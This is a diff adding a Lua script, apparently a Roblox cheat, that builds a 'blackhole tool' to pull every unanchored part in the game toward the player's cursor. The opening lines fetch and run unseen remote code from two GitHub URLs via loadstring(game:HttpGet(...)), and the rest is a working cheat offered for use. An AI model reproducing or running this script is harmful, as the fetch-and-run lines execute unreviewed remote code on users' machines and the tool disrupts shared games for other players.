@@ -1,0 +1,129 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/evilionx3/new-scripts/refs/heads/main/partclaim.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/evilionx3/discord/refs/heads/main/r"))()
+-- not obfuscated because i used chatgpt lmao
+
+local input = game:GetService("UserInputService")
+local players = game:GetService("Players")
+local player = players.LocalPlayer
+local mouse = player:GetMouse()
+
+local createdBodyPositions = {}
+local originalPositions = {}  -- Сохраняем оригинальные позиции
+local currentTarget = nil -- Текущая цель
+
+-- Функция для создания и настройки инструмента
+local function createTool()
+    local tool = Instance.new("Tool")
+    tool.RequiresHandle = false
+    tool.Name = "evilions blackhole tool"
+    tool.Parent = player.Backpack
+    tool.ToolTip = "Unequip = stop bringing parts"
+
+    local function moveParts(target)
+        currentTarget = target -- Обновляем текущую цель
+        local function updatePart(part)
+            if part:IsA("BasePart") and not part.Anchored and not part:IsDescendantOf(player.Character) then
+                -- Проверяем, что часть не принадлежит другому игроку
+                local owner = players:GetPlayerFromCharacter(part.Parent)
+                if owner then return end -- Пропускаем части, принадлежащие другим игрокам
+
+                local bp = part:FindFirstChildOfClass("BodyPosition")
+                if not bp then
+                    bp = Instance.new("BodyPosition")
+                    bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                    bp.Parent = part
+                    table.insert(createdBodyPositions, bp)
+                    
+                    -- Сохраняем оригинальную позицию
+                    originalPositions[part] = part.Position
+                end
+                bp.Position = currentTarget -- Используем текущую цель
+            end
+        end
+
+        for _, part in pairs(workspace:GetDescendants()) do
+            updatePart(part)
+        end
+
+        workspace.DescendantAdded:Connect(updatePart)
+    end
+
+    local function clearBodyPositions()
+        -- Вместо уничтожения BodyPosition, просто очищаем массив
+        createdBodyPositions = {}
+        
+        -- Оставляем части в том месте, где они находятся
+        for part, originalPosition in pairs(originalPositions) do
+            if part and part.Parent then
+                part.Position = part.Position -- Оставляем части на месте
+            end
+        end
+        originalPositions = {}
+    end
+
+    local isHolding = false
+
+    local function updatePartsFollowingMouse()
+        while isHolding do
+            currentTarget = mouse.Hit.p -- Обновляем текущую цель в цикле
+            if currentTarget then
+                moveParts(currentTarget)
+            end
+            task.wait(0) -- Обновляем каждую кадр
+        end
+    end
+
+    -- Логика активации инструмента
+    tool.Activated:Connect(function()
+        if not isHolding then
+            isHolding = true
+            if input.TouchEnabled then
+                -- Мобильный: Установить позицию один раз при нажатии
+                local targetPosition = mouse.Hit.p
+                moveParts(targetPosition)
+                isHolding = false
+            else
+                -- ПК: Начать перетаскивание
+                updatePartsFollowingMouse()
+            end
+        end
+    end)
+
+    -- Логика анекюпления инструмента
+    tool.Unequipped:Connect(function()
+        isHolding = false
+        clearBodyPositions()
+    end)
+
+    -- Прослушиваем события нажатия кнопок мыши (ПК)
+    input.InputBegan:Connect(function(inputObj)
+        if inputObj.UserInputType == Enum.UserInputType.MouseButton1 and player.Character:FindFirstChildOfClass("Tool") == tool then
+            if not isHolding and not input.TouchEnabled then
+                isHolding = true
+                updatePartsFollowingMouse()
+            end
+        end
+    end)
+
+    input.InputEnded:Connect(function(inputObj)
+        if inputObj.UserInputType == Enum.UserInputType.MouseButton1 and player.Character:FindFirstChildOfClass("Tool") == tool then
+            isHolding = false
+        end
+    end)
+
+    -- Прослушиваем события касания в мире (Мобильный)
+    input.TouchTapInWorld:Connect(function(touchPositions, gameProcessedEvent)
+        if not gameProcessedEvent and player.Character:FindFirstChildOfClass("Tool") == tool then
+            local touchPosition = touchPositions[1]
+            local targetPosition = workspace.CurrentCamera:ScreenPointToRay(touchPosition.X, touchPosition.Y).Origin
+            moveParts(targetPosition)
+        end
+    end)
+end
+
+createTool()
+
+player.CharacterAdded:Connect(function()
+    player.Character:WaitForChild("Humanoid")
+    createTool()
+end)
